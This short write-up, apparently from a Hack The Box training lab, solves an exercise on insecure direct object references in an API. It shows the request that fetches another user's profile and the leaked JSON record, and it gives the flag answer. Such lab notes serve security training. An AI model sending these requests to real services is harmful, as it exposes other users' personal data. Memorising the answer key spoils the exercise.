# IDOR in Insecure API
## Questions
1. Try to read the details of the user with 'uid=5'. What is their 'uuid' value? **Answer: eb4fe264c10eb7a528b047aa983a4829**
   - IDOR at:
        ```
        GET /profile/api.php/profile/5 HTTP/1.1
        ```
        ```
        {"uid":"5","uuid":"eb4fe264c10eb7a528b047aa983a4829","role":"employee","full_name":"Callahan Woodhams","email":"c_woodhams@employees.htb","about":"I don't like quoting others!"}
        ```